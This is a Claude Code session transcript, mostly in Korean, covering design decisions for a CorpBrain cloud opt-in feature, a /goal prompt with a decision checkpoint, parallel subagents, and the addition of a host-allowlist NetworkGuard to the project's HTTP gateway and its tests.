      14  - [x] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | status:RES
          OLVED | decision:체크섬 없는 형태 기반 느슨한 매칭 원칙 채택, 7
          종 각각 구체 정규식 확정(계좌번호는 은행별 표준 부재로 휴리스틱
          임을 명시) | applied:corpbrain-v0.5-cloud-opt-in.md §4.5
      15  - [x] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | s
          tatus:RESOLVED | decision:기존 PROMPT_TEMPLATE 재사용(JSON강제 
          문구만 제거), tool명 emit_summary, minItems/maxItems 미지정으로
           로컬과 검증규칙 일치, max_tokens=2048 | applied:corpbrain-v0.5
          -cloud-opt-in.md §4.3
      16 -- [ ] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | 
         -depends:-  | status:UNRESOLVED                                 
      16 +- [x] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | 
         +status:RESOLVED | decision:임시파일+os.replace 원자적 쓰기 | ap
         +plied:corpbrain-v0.5-cloud-opt-in.md §4.2                      
      17  - [ ] T8 | MINOR | doctor/consent 명령 출력 문구 포맷 | depends
          :-  | status:UNRESOLVED

● [반영 완료] T7 → decision: 임시파일+os.replace 원자적 쓰기
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §4.2 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 7 / TOTAL 8)

  ---

  [진척] RESOLVED 7 / TOTAL 8 · 현재 토픽: T8 doctor/consent 명령 출력 문구 포맷

  마지막 토픽이다. v0.3의 doctor는 GPU 없음을 "경고"로 표시하되 전체 판정(exit
  0/1)에는 영향을 주지 않는 선례가 있다. Cloud 동의·API 키도 같은
  성격(옵트인이라 기본 상태에서 없는 게 정상)인지, 아니면 하나라도 없으면 doctor
  전체를 실패로 볼지가 스펙에 없다.

  [선택지]
  - A) Cloud 동의·API 키 상태는 GPU와 동일하게 정보/경고로만 표시하고 doctor의
    전체 exit code(로컬 환경 판정)에는 영향을 주지 않는다 — cloud를 안 쓰는
    절대다수 사용자에게 doctor가 불필요하게 실패로 보이지 않음 (추천)
  - B) 동의·키 중 하나라도 없으면 doctor 전체가 exit 1(실패)로 판정 — cloud를
    쓰려는 사용자에게는 더 단호한 신호지만, 기본 상태(로컬만 쓰는 사용자)에서도
    "실패"로 보여 혼란 유발

  [권장] A) — GPU 선례와 완전히 같은 논리(로컬 판정만 blocking, 나머지는 정보성
  경고)이고, "기본은 로컬"이라는 스펙 §1의 원칙과도 일치한다.

● User answered Claude's questions:
  ⎿  · T8. doctor의 Cloud 동의·API키 상태는 전체 exit code에 영향을 줄까? → 
     정보/경고만, exit code 영향 없음 (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 5 lines, removed 3 lines
      76     - 검증: 통합테스트 — local→cloud, cloud→cloud 두 시나리오에
          서 `generated_at`/`engine`
      77       변경 여부로 재생성·스킵 판정 확인.
      78  10. `corpbrain doctor`는 `--engine` 플래그 유무와 무관하게 항상
           cloud 동의 여부와
      79 -    `ANTHROPIC_API_KEY` 존재 여부를 점검 항목에 포함해 보고한다
         -(존재하지 않는 로컬 전용                                       
      80 -    doctor 결과에는 영향을 주지 않는다).                       
      81 -    - 검증: 통합테스트 — 동의/키 유무 4가지 조합의 출력 확인.  
      79 +    `ANTHROPIC_API_KEY` 존재 여부를 점검 항목에 포함해 보고한다
         +. 이 두 항목은 v0.3의 GPU                                      
      80 +    선례와 동일하게 **정보/경고성**으로만 표시되며 `doctor`의  
         +전체 종료 코드에는 영향을 주지                                 
      81 +    않는다(전체 exit code는 기존과 동일하게 로컬 Ollama·모델·GP
         +U 판정만으로 결정된다).                                        
      82 +    - 검증: 통합테스트 — 동의/키 유무 4가지 조합에서 출력 문구 
         +는 달라지되 exit code는                                        
      83 +      로컬 판정 결과만 반영함을 확인.                          
      84  11. `--engine cloud`일 때 v0.3의 GPU 게이트(§4.2 v0.3 스펙)는 
          자동으로 생략되어, GPU 미탐지
      85      환경에서도 cloud 처리가 차단되지 않는다. `--max-total-token
          s` 토큰 게이트는 `engine`과
      86      무관하게 v0.3과 동일하게 적용된다.

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 10 lines
      117  - API 키: `ANTHROPIC_API_KEY` 환경변수로만 받는다(Anthropic 공
           식 SDK/도구와 동일한 이름을
      118    재사용해 사용자가 이미 설정해 둔 값을 그대로 쓸 수 있게 한다
           ). CLI 플래그·설정 파일에는
      119    저장하지 않는다. [사용자 결정]
      120 +- **doctor 출력 문구** [제안 후 승인]: v0.3의 OK/실패/경고 마 
          +커 체크리스트 뒤에 cloud 항목                                 
      121 +  두 줄을 추가한다. GPU와 동일하게 **경고 마커**를 쓰며 doctor
          +의 전체 exit code에는 영향을                                  
      122 +  주지 않는다.                                                
      123 +  ```                                                         
      124 +  [경고] Cloud 동의: 없음 — corpbrain consent cloud --grant 로
          + 동의                                                         
      125 +  [경고] ANTHROPIC_API_KEY: 미설정 — 환경변수로 설정 필요     
      126 +  ```                                                         
      127 +  둘 다 충족되면 `[OK] Cloud(Anthropic): 사용 준비됨`으로 표시
          +한다.                                                         
      128 +- **consent 명령 출력**: `--grant`/`--revoke` 모두 실행 결과를
          + 한국어 한 줄로 stdout에 낸다                                 
      129 +  (예: `cloud 엔진(Anthropic API) 동의를 저장했습니다.` / `clo
          +ud 엔진 동의를 철회했습니다.`).                               
      130  
      131  ### 4.2 동의 저장소 [제안 후 승인]
      132  - 위치: `~/.corpbrain/config.json` (사용자 홈 디렉터리 하위, 
           프로세스 전역 — 이번 슬라이스의

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 1 line, removed 1 line
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 7 / TOTAL: 8                                         
       8 +RESOLVED: 8 / TOTAL: 8  ·  STOP: ALL_RESOLVED                  
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11  - [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
          ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉
          시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
          pbrain-v0.5-cloud-opt-in.md §4.3

● Update(docs\grill\GRILL_LEDGER-v0.5.md)  ⎿  Added 1 line, removed 1 line
      14  - [x] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | status:RES
          OLVED | decision:체크섬 없는 형태 기반 느슨한 매칭 원칙 채택, 7
          종 각각 구체 정규식 확정(계좌번호는 은행별 표준 부재로 휴리스틱
          임을 명시) | applied:corpbrain-v0.5-cloud-opt-in.md §4.5
      15  - [x] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | s
          tatus:RESOLVED | decision:기존 PROMPT_TEMPLATE 재사용(JSON강제 
          문구만 제거), tool명 emit_summary, minItems/maxItems 미지정으로
           로컬과 검증규칙 일치, max_tokens=2048 | applied:corpbrain-v0.5
          -cloud-opt-in.md §4.3
      16  - [x] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | 
          status:RESOLVED | decision:임시파일+os.replace 원자적 쓰기 | ap
          plied:corpbrain-v0.5-cloud-opt-in.md §4.2
      17 -- [ ] T8 | MINOR | doctor/consent 명령 출력 문구 포맷 | depends
         -:-  | status:UNRESOLVED                                        
      17 +- [x] T8 | MINOR | doctor/consent 명령 출력 문구 포맷 | status:
         +RESOLVED | decision:cloud 상태는 GPU와 동일하게 경고 마커로만  
         +표시, doctor 전체 exit code에 영향 없음, 구체 문구 확정 | appli
         +ed:corpbrain-v0.5-cloud-opt-in.md §3 항목10, §4.1              

● [반영 완료] T8 → decision: cloud 동의·API키 상태는 GPU 선례와 동일하게 경고
  마커로만 표시, doctor 전체 exit code에는 영향 없음
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §3 항목10, §4.1 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 8 / TOTAL 8)

  ---

  [종료: ALL_RESOLVED] RESOLVED 8 / TOTAL 8

  v0.5 스펙의 구현 착수 전 세부설계 모호함 8개 토픽을 전부 해소했다. 이번
  세션에서 반영된 변경:

  설계문서 — static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.md
  - §4.4 NetworkGuard: urlsplit 기반 정확 호스트 매칭 + 리다이렉트 차단 구현
    방식
  - §4.3: GET /v1/models 인증 프리플라이트, 타임아웃(60초 재사용), 프롬프트·tool
    스키마(emit_summary, max_tokens=2048) 상세
  - §3 항목8: 429/5xx/기타 오류의 SkipReason 매핑 규칙(2종)
  - §4.5: PII 7종 정규식 실제 패턴(형태 기반, 계좌번호는 명시적 휴리스틱)
  - §4.2: 동의 설정파일 원자적 쓰기
  - §3 항목10, §4.1: doctor/consent 출력 문구, cloud 상태의 exit-code 비영향

  원장 — docs/grill/GRILL_LEDGER-v0.5.md (신규, RESOLVED 8/8)
  하네스(CLAUDE.md): 변경 없음 — 8개 모두 기존 CLAUDE.md 원칙(단일 관문 등)의 이
  기능 한정 구체화이며, 새로운 반복 규칙을 만들지 않음(v0.2~v0.4 grill 세션과
  동일한 판단).

  이제 static/docs/specs/features/corpbrain-v0.5-cloud-opt-in.md가 코드 레벨
  세부사항까지 채워진 상태다. 다음 단계는 feat/* 브랜치를 열어 TDD로 구현을
  시작하는 것이다.

✻ Brewed for 11m 32s

✻ Claude resuming /loop wakeup (Aug 21 2:08pm)

  Ran 1 shell command (ctrl+o to expand)

● 여전히 조용하다 — /grill-it 세션이 8개 토픽 전부 해소로 자연스럽게 마무리됐고,
  스펙/원장 파일 2개(corpbrain-v0.5-cloud-opt-in.md, GRILL_LEDGER-v0.5.md)가
  main에 커밋되지 않은 채 남아있다. 커밋도, feat/* 브랜치 구현 착수도 명시적
  요청 없이는 진행하지 않는다.

● Nothing actionable — the grill-it session wrapped up cleanly and the next move
  (committing the docs or starting the feat/* implementation) needs your
  go-ahead. Next check-in in 30 minutes.

✻ Worked for 18s

❯ /logout 
  ⎿  This background session shares credentials with other sessions; /logout here has no effect. Run /logout from your main terminal to sign out.

● Remote Control disconnected — signed-in claude.ai account or 
  organization changed on this machine — run /remote-control to start a 
  session for the current account, or /login to switch back, then 
  /remote-control

❯ /login                                                                        
  ⎿  Login successful. Remote Control disconnected.

❯ /model                                                                        
  ⎿  Set model to Opus 5 (1M context) (default) and saved as your default for
     new sessions

❯ /goal-setting                                                                 
C:/Users/docto/orca/CorpBrain-app-01/docs/grill/GRILL_LEDGER-v0.5.md            
  C:/Users/docto/orca/CorpBrain-app-01/static/docs/specs/features/corpbrain-v0. 
5-cloud-opt-in.md                                                               
                                                                                
  위 파일들과 현재 프로젝트의 GitHub Issue 및 PR 진행상태를 확인하고,           
  후속 작업으로 한번에 처리할 수 있는 최대 작업 범위를 목표로 설정해서 다음     
에이전틱 루프를 실행하고 싶어. goal 에 "조기 종료 조건"으로는 기존 문서에서     
명확하게 정해놓지 않은 핵심 의사결정사항이 3가지 이상 누적되거나, 부수적인      
의사결정사항이 10가지 이상 누적되는 경우로 설정해주고, 이 카운팅은 별도 문서를  
체크포인트로 두어서 멀티에이전트 작업에서도 명확하게 확인할 수 있도록 명시해줘. 
추가적으로 독립적으로 동시에 수행해도 되는 개발파트가 있다면 2개 이상의         
에이전트를 이용해 개발 해줘.                                                    

  Searched for 1 pattern, read 1 file, listed 1 directory, ran 1 shell command (ctrl+o to expand)

● 프로젝트 상태를 확인했다: 열린 이슈 0개, 열린 PR 0개, 마일스톤 없음. main은
  v0.4 완료 태그 상태이고, v0.5 스펙과 grill 원장 2개 파일만 미커밋으로
  남아있다. v0.3 구현 루프의 기존 /goal 패턴을 정본으로 삼아 설계하겠다.

  병렬 분리 지점을 스펙에서 확인하면 — core/pii.py(정규식 7종)와
  core/consent.py(동의 저장소)는 서로도, 게이트웨이 작업과도 파일이 겹치지 않는
  순수 leaf 모듈이다. 이 둘을 서브에이전트 2개에 맡기고, 공유
  파일(gateway·pipeline·cli)은 메인이 직렬로 처리하면 충돌 없이 병렬화된다.

● Write(docs\goals\corpbrain-v0.5-cloud-opt-in-loop.md)
  ⎿  Wrote 57 lines to docs\goals\corpbrain-v0.5-cloud-opt-in-loop.md
      1 /goal
      3 ## 1) 작업 핵심 목표 및 범위
        d` 의 "완료의 정의"(§3) 13개 항목을 모두 구현해 `uv run ruff chec
        k .` 와 `uv run pytest` 가 exit 0 이 되게 하고, `/security-review
      5 - 시작 지점: `main`(tag v0.4 완료 상태)에서 `feat/v0.5-cloud-opt-
        d) 상태인 `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
        없이** 브랜치의 첫 커밋으로 포함한다.
      6 - 작업 대상: v0.5 스펙이 정의한 클라우드 옵트인 경로 전체 — 신규 
        re/llm/anthropic_client.py`, 확장 대상 `corpbrain/core/gateway.py
        con
     … +150 lines (ctrl+o to expand)

● [의도 재진술] v0.5 스펙과 grill 원장이 확정되고 열린 이슈·PR이 없는 지금, v0.5
  클라우드 옵트인 구현 전체(완료의 정의 13개 항목 + 보안 검토 + draft PR)를 한
  루프의 최대 범위로 잡고, 독립 leaf 모듈 2개는 서브에이전트로 병렬 처리하며,
  미확정 결정이 CORE 3건·MINOR 10건 누적되면 체크포인트 문서를 근거로 조기
  종료하는 /goal 프롬프트를 원한다.

  ---

  [/goal 프롬프트] 본문이 4,000자를 넘어 파일로 저장했다 —
  docs/goals/corpbrain-v0.5-cloud-opt-in-loop.md

  /goal 지금부터 docs/goals/corpbrain-v0.5-cloud-opt-in-loop.md 에 명시된 목표를
  달성하기 위한 작업을 시작하라

  ---

  [Self-Check]

  - [x] Required Sections — 1)~4) 모두 채움 (+ 5) GitHub 연동 · 6) 체크포인트
    규격 추가)
  - [x] Feasible — 목표가 uv run ruff check .·uv run pytest exit 0 + 스펙 §3
    13개 항목 + /security-review 고위험 0건으로 환원됨
  - [x] Demonstrable — 종료 방법 5단계가 두 검증 명령 exit code, 체크포인트
    카운터 cat, git diff --name-only main, gh pr list 출력을 모두 대화에 surface
  - [x] Bounded scope — §4가 수정 금지 파일과 활성 범위 밖 변경 금지를 명시,
    비목표 7항목도 재확인
  - [x] Stop clause — CORE_BUDGET(≥3) · MINOR_BUDGET(≥10) · ALL_DONE ·
    TURN_CAP(60 turns) 4개 종료 경로
  - [x] Atomic — 단일 목표(v0.5 구현 → PR), 병렬 서브에이전트는 같은 목표 내
    분업

  병렬화 설계: 파트 A(core/pii.py)와 파트 B(core/consent.py)는 서로도 메인
  작업과도 파일이 전혀 겹치지 않아 서브에이전트 2개로 동시 실행하고, 공유
  파일(gateway·pipeline·cli)은 메인이 직렬 처리한다. 체크포인트 쓰기는 카운터
  유실 방지를 위해 메인으로 직렬화하되 읽기는 모든 에이전트에 열어뒀다.

  ---

  [사용 안내] 위 코드블록을 그대로 Claude Code에 붙여넣어 실행하세요. /goal만
  입력하면 진행 상태와 평가자 판단 이유를 확인할 수 있습니다.

✻ Brewed for 2m 20s

❯ /goal 지금부터 docs/goals/corpbrain-v0.5-cloud-opt-in-loop.md 에 명시된       
목표를 달성하기 위한 작업을 시작하라                                            
  ⎿  Goal set: 지금부터 docs/goals/corpbrain-v0.5-cloud-opt-in-loop.md 에 명시된
     목표를 달성하기 위한 작업을 시작하라

● v0.5 클라우드 옵트인 구현 루프를 시작한다. 브랜치 생성 → 미커밋 문서 커밋 →
  체크포인트 생성 → 병렬 서브에이전트 착수 순으로 진행하겠다.

  Ran 1 shell command (ctrl+o to expand)

● Write(docs\loop\DECISION_CHECKPOINT-v0.5.md)
  ⎿  Wrote 18 lines to docs\loop\DECISION_CHECKPOINT-v0.5.md
       1 # DECISION CHECKPOINT — v0.5 클라우드 옵트인 구현 루프
       2 
       3 이 문서는 v0.5 구현 루프의 **조기 종료 판정 단일 근거**다.
         한다.
       5 
       6 CORE: 0
       7 MINOR: 0
       9 ## 기록 규칙
      10 - 형식: `- [CORE|MINOR] <결정> | 근거 | 관련 파일 | 결정 주체(ma
         in|sub-A|sub-B)`
     … +14 lines (ctrl+o to expand)

  Ran 1 shell command (ctrl+o to expand)
● 2 background agents launched (↓ to manage)
   ├ 파트 A: core/pii.py 구현
   └ 파트 B: core/consent.py 구현

● 서브에이전트 2개가 파트 A·B를 병렬로 진행 중이다. 나는 파트 C(공유 파일
  spine)를 시작한다.

  Read 7 files, ran 1 shell command (ctrl+o to expand)

● 확인: summarize.DEFAULT_TIMEOUT = 300.0, embed = 60.0 — 스펙 §4.3의 "60초 공유
  상수" 서술이 실제와 다르다. 첫 의사결정 항목이 생겼다. 계속 통합 지점을
  읽는다.

  Read 2 files (ctrl+o to expand)

● 통합 지점 파악을 마쳤다. 파트 C 구현을 시작한다 — 먼저 관문(gateway) 확장이다.

● Update(corpbrain\core\gateway.py)
  ⎿  Added 9 lines, removed 7 lines
       1  """프로세스의 유일한 외부 네트워크 출구 — 단일 외부호출 관문 (
          스펙 §4.5).
       2  
       3 -코어의 다른 모듈(`ollama` 등)은 `urllib.request`·`http.client`·
         -서드파티 HTTP 라이브러리를                                     
       4 -직접 호출하지 않고, 반드시 이 모듈의 `request_json()`만 경유한 
         -다. 이 이음새 덕분에                                           
       5 -후속 슬라이스의 클라우드 엔진·NetworkGuard·PII 마스킹 게이트를 
         -이 한 곳에만 얹으면 된다.                                      
       3 +코어의 다른 모듈(`ollama`·`anthropic` 등)은 `urllib.request`·`h
         +ttp.client`·서드파티 HTTP                                      
       4 +라이브러리를 직접 호출하지 않고, 반드시 이 모듈의 `request_json
         +()`만 경유한다. 이 이음새                                      
       5 +덕분에 NetworkGuard(목적지 allowlist·리다이렉트 차단)를 이 한  
         +곳에만 얹으면 로컬·클라우드                                    
       6 +경로가 함께 보호된다.                                          
       7  
       7 -이번 슬라이스에서 실제로 나가는 호출은 로컬 Ollama(`--ollama-ur
         -l`) 하나뿐이며(스펙 §3-6),                                     
       8 -테스트는 이 단일 지점을 monkeypatch로 스텁하고 `requested_urls(
         -)`로 감시해                                                    
       9 -'localhost 외 연결 없음'을 검증한다.                           
       8 +나가는 호출은 두 갈래뿐이다 — 로컬 Ollama(`--ollama-url`)와, `-
         +-engine cloud`일 때의                                          
       9 +Anthropic API(`api.anthropic.com`). 테스트는 이 단일 지점을 mon
         +keypatch로 스텁하고                                            
      10 +`requested_urls()`로 감시해 '허용된 목적지 외 연결 없음'을 검증
         +한다 (v0.5 스펙 §3 항목7).                                     
      11  
      12  표준 라이브러리(`urllib.request`)만 사용한다 — 서드파티 HTTP 의
          존성을 두지 않는다.
      13  """
     ...
      17  import json
      18  import urllib.error
      19  import urllib.request
      19 -from collections.abc import Mapping                            
      20 +from collections.abc import Mapping, Sequence                  
      21  from typing import Any
      22 +from urllib.parse import urlsplit  # 순수 문자열 파싱 — 네트워 
         +크 호출 없음                                                   
      23  
      24  from corpbrain.core.errors import CorpBrainError
      25  

● Update(corpbrain\core\gateway.py)
  ⎿  Added 59 lines
       40          self.url = url
       41  
       42  
       43 +class NetworkGuardError(GatewayError):                        
       44 +    """NetworkGuard가 목적지를 거부했다 — 소켓을 열기 전에 차 
          +단된다 (v0.5 스펙 §4.4).                                      
       45 +                                                              
       46 +    허용 호스트(allowlist) 불일치, HTTPS 강제 위반, 리다이렉트
          + 추적 시도가 여기에 해당한다.                                 
       47 +    """                                                       
       48 +                                                              
       49 +                                                              
       50 +class _NoRedirectHandler(urllib.request.HTTPRedirectHandler): 
       51 +    """리다이렉트를 추적하지 않고 즉시 실패시킨다 (v0.5 스펙 §
          +4.4).                                                         
       52 +                                                              
       53 +    3xx 응답을 따라가면 NetworkGuard가 승인한 목적지 밖으로 요
          +청이 새어 나갈 수 있으므로,                                   
       54 +    따라가는 대신 원래 3xx를 그대로 오류로 올린다. 표준 핸들러
          +의 `redirect_request`를                                       
       55 +    `None` 반환으로 무력화하면 `urlopen`이 `HTTPError`를 그대 
          +로 전파한다.                                                  
       56 +    """                                                       
       57 +                                                              
       58 +    def redirect_request(self, req, fp, code, msg, headers, ne
          +wurl):  # noqa: ANN001, ANN201, D102                          
       59 +        return None                                           
       60 +                                                              
       61 +                                                              
       62 +#: 리다이렉트를 따라가지 않는 opener — 모든 요청이 이 opener로
          +만 나간다.                                                    
       63 +_OPENER = urllib.request.build_opener(_NoRedirectHandler)     
       64 +                                                              
       65 +                                                              
       66 +def _guard_destination(                                       
       67 +    url: str,                                                 
       68 +    *,                                                        
       69 +    allowed_hosts: Sequence[str] | None,                      
       70 +    require_https: bool,                                      
       71 +) -> None:                                                    
       72 +    """소켓을 열기 전에 목적지를 검사한다 — NetworkGuard (v0.5
          + 스펙 §4.4).                                                  
       73 +                                                              
       74 +    `urlsplit`으로 스킴·호스트만 뽑아 **대소문자 무시 정확 일 
          +치**로 판정한다.                                              
       75 +    서픽스·와일드카드 매칭은 쓰지 않는다(하드코딩 단일 호스트 
          +원칙).                                                        
       76 +                                                              
       77 +    Args:                                                     
       78 +        url: 검사할 대상 URL.                                 
       79 +        allowed_hosts: 허용 호스트 목록. `None`이면 호스트를  
          +제한하지 않는다.                                              
       80 +        require_https: True면 스킴이 `https`가 아닐 때 거부한 
          +다.                                                           
       81 +                                                              
       82 +    Raises:                                                   
       83 +        NetworkGuardError: 스킴·호스트가 허용 범위 밖일 때.   
       84 +    """                                                       
       85 +    parts = urlsplit(url)                                     
       86 +    scheme = parts.scheme.lower()                             
       87 +    if require_https and scheme != "https":                   
       88 +        raise NetworkGuardError(                              
       89 +            f"이 목적지는 HTTPS만 허용됩니다: {url} (스킴 {sch
          +eme or '없음'})", url=url                                     
       90 +        )                                                     
       91 +    if allowed_hosts is None:                                 
       92 +        return                                                
       93 +    hostname = (parts.hostname or "").lower()                 
       94 +    if hostname not in {host.lower() for host in allowed_hosts
          +}:                                                            
       95 +        allowed = ", ".join(allowed_hosts) or "(없음)"        
       96 +        raise NetworkGuardError(                              
       97 +            f"허용되지 않은 목적지입니다: {hostname or '(호스 
          +트 없음)'} — 허용: {allowed}",                                
       98 +            url=url,                                          
       99 +        )                                                     
      100 +                                                              
      101 +                                                              
      102  def requested_urls() -> tuple[str, ...]:
      103      """관문이 시도한 URL을 요청 순서대로 돌려준다 (스냅샷).
      104  

● Update(corpbrain\core\gateway.py)
  ⎿  Added 21 lines, removed 11 lines
      117      *,
      118      method: str = "GET",
      119      payload: Mapping[str, Any] | None = None,
      120 +    headers: Mapping[str, str] | None = None,                 
      121      timeout: float = 60.0,
      122 +    allowed_hosts: Sequence[str] | None = None,               
      123 +    require_https: bool = False,                              
      124  ) -> Any:
      125      """외부에 JSON 요청을 보내고 응답 JSON을 파싱해 반환한다 —
            프로세스의 유일한 출구.
      126  
     ...
      129              이 인자로 관문 통과 지점을 감시한다.
      130          method: HTTP 메서드.
      131          payload: 주어지면 JSON으로 직렬화해 본문으로 보낸다. `
           None`이면 본문 없는 요청.
      132 +        headers: 추가 요청 헤더(선택). 인증 헤더 등 provider  
          +고유 헤더를 싣는 통로다                                       
      133 +            (v0.5 스펙 §4.3 — 공식 SDK 없이 raw HTTP로 호출하 
          +기 위함). 기본 헤더                                           
      134 +            (`Accept`·`Content-Type`)와 키가 겹치면 이 값이 이
          +긴다.                                                         
      135          timeout: 소켓 타임아웃(초).
      136 +        allowed_hosts: NetworkGuard 허용 호스트 목록 (v0.5 스 
          +펙 §4.4). 주어지면 소켓을                                     
      137 +            열기 전에 목적지 호스트를 대소문자 무시 정확 일치 
          +로 검사한다.                                                  
      138 +        require_https: True면 HTTPS 스킴만 허용한다 (클라우드 
          +경로).                                                        
      139  
      140      Returns:
      141          응답 본문을 JSON 파싱한 값.
      142  
      143      Raises:
      144 +        NetworkGuardError: 목적지가 allowlist 밖이거나 HTTPS  
          +강제를 위반.                                                  
      145          GatewayError: 연결 실패·타임아웃·HTTP 오류 상태·JSON 
           직렬화/파싱 실패.
      146      """
      137 -    # --- 후속 확장 삽입 지점 (이번 슬라이스에서는 구현하지 않
          -는다 — 스펙 §2 비목표) ---                                    
      138 -    # NetworkGuard: 목적지 허용 판정(호스트·스킴 allowlist, 리
          -다이렉트 추적 차단)은                                         
      139 -    #   소켓을 열기 전인 이 지점에 들어간다.                  
      140 -    # PII 마스킹 게이트: 클라우드 엔진(Option A) 도입 시 `payl
          -oad` 마스킹과 사용자 동의                                     
      141 -    #   확인도 같은 지점에서 수행한다.                        
      142 -    # 이번 슬라이스는 로컬 Ollama 호출뿐이므로 두 게이트 모두 
          -두지 않고, 대신 시도한                                        
      143 -    # URL만 기록해 테스트가 목적지를 감시할 수 있게 한다.     
      147 +    # NetworkGuard: 목적지 판정은 소켓을 열기 **전에** 끝낸다 
          +(v0.5 스펙 §4.4).                                             
      148 +    # 거부된 요청은 `_REQUESTED_URLS`에 남기지 않는다 — 시도조
          +차 하지 않았기 때문이다.                                      
      149 +    _guard_destination(url, allowed_hosts=allowed_hosts, requi
          +re_https=require_https)                                       
      150 +                                                              
      151      _REQUESTED_URLS.append(url)
      152  
      146 -    headers = {"Accept": "application/json"}                  
      153 +    request_headers = {"Accept": "application/json"}          
      154      body: bytes | None = None
      155      if payload is not None:
      156          try:
     ...
      159              raise GatewayError(
      160                  f"요청 본문을 JSON으로 직렬화하지 못했습니다: 
           {exc}", url=url
      161              ) from exc
      155 -        headers["Content-Type"] = "application/json"          
      162 +        request_headers["Content-Type"] = "application/json"  
      163 +    if headers:                                               
      164 +        request_headers.update(headers)                       
      165  
      157 -    request = urllib.request.Request(url, data=body, headers=h
          -eaders, method=method)                                        
      166 +    request = urllib.request.Request(url, data=body, headers=r
          +equest_headers, method=method)                                
      167      try:
      159 -        with urllib.request.urlopen(request, timeout=timeout) 
          -as response:                                                  
      168 +        # 리다이렉트를 따라가지 않는 opener로만 나간다 — 승인 
          +된 목적지 밖으로 새지 않게 한다.                              
      169 +        with _OPENER.open(request, timeout=timeout) as respons
          +e:                                                            
      170              raw = response.read()
      171      except urllib.error.HTTPError as exc:
      172          detail = _read_error_body(exc)

● 관문 호출 seam이 urlopen → 커스텀 opener로 바뀌었다. 기존 게이트웨이 테스트의
  스텁 지점을 확인해야 한다.

  Read 1 file (ctrl+o to expand)

● Update(tests\test_gateway.py)
  ⎿  Added 3 lines, removed 1 line
      1  """단일 외부호출 관문 검증 (FR-003 / 스펙 §4.5, 완료의 정의 6번)
         .
      2  
      3 -실제 소켓은 열지 않는다 — `urllib.request.urlopen`을 monkeypatch
        -로 스텁해                                                       
      3 +실제 소켓은 열지 않는다 — 관문 내부의 opener(`gateway._OPENER`) 
        +를 monkeypatch로 스텁해                                         
      4  관문이 만들어 보내는 요청과 오류 변환, 그리고 목적지 감시 훅을 
         확인한다.
      5 +v0.5부터 관문은 리다이렉트를 따라가지 않는 전용 opener로만 나가 
        +므로(스펙 §4.4),                                                
      6 +스텁 지점도 `urllib.request.urlopen`이 아니라 이 opener다.      
      7  """
      8  
      9  from __future__ import annotations

● Update(tests\test_gateway.py)
  ⎿  Added 21 lines, removed 13 lines
      41          return False
      42  
      43  
      44 +class _FakeOpener:                                             
      45 +    """`gateway._OPENER`를 대신하는 스텁 — `.open(request, time
         +out=...)`만 흉내낸다."""                                       
      46 +                                                               
      47 +    def __init__(self, body: bytes, error: Exception | None) ->
         + None:                                                         
      48 +        self._body = body                                      
      49 +        self._error = error                                    
      50 +        self.calls: list[tuple[urllib.request.Request, float | 
         +None]] = []                                                    
      51 +                                                               
      52 +    def open(  # noqa: A003 - urllib OpenerDirector의 이름을 그
         +대로 흉내낸다                                                  
      53 +        self, request: urllib.request.Request, timeout: float |
         + None = None                                                   
      54 +    ) -> _FakeResponse:                                        
      55 +        self.calls.append((request, timeout))                  
      56 +        if self._error is not None:                            
      57 +            raise self._error                                  
      58 +        return _FakeResponse(self._body)                       
      59 +                                                               
      60 +                                                               
      61  def _stub_urlopen(
      62      monkeypatch: pytest.MonkeyPatch,
      63      *,
      64      body: bytes = b"{}",
      65      error: Exception | None = None,
      66  ) -> list[tuple[urllib.request.Request, float | None]]:
      50 -    """관문 내부의 `urlopen`을 스텁하고 관측된 (요청, 타임아웃)
         - 목록을 돌려준다."""                                           
      51 -    calls: list[tuple[urllib.request.Request, float | None]] = 
         -[]                                                             
      67 +    """관문 내부의 opener를 스텁하고 관측된 (요청, 타임아웃) 목
         +록을 돌려준다."""                                              
      68 +    opener = _FakeOpener(body, error)                          
      69 +    monkeypatch.setattr(gateway, "_OPENER", opener)            
      70 +    return opener.calls                                        
      71  
      53 -    def fake_urlopen(                                          
      54 -        request: urllib.request.Request, timeout: float | None 
         -= None                                                         
      55 -    ) -> _FakeResponse:                                        
      56 -        calls.append((request, timeout))                       
      57 -        if error is not None:                                  
      58 -            raise error                                        
      59 -        return _FakeResponse(body)                             
      72  
      61 -    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen
         -)                                                              
      62 -    return calls                                               
      63 -                                                               
      64 -                                                               
      73  @pytest.fixture(autouse=True)
      74  def _reset_gateway_observations() -> Any:
      75      """관문의 URL 기록을 테스트마다 격리한다."""

● Update(tests\test_gateway.py)
  ⎿  Added 105 lines
      238      assert hosts <= {"127.0.0.1", "localhost", "::1"}
      239  
      240  
      241 +ANTHROPIC_URL = "https://api.anthropic.com/v1/messages"       
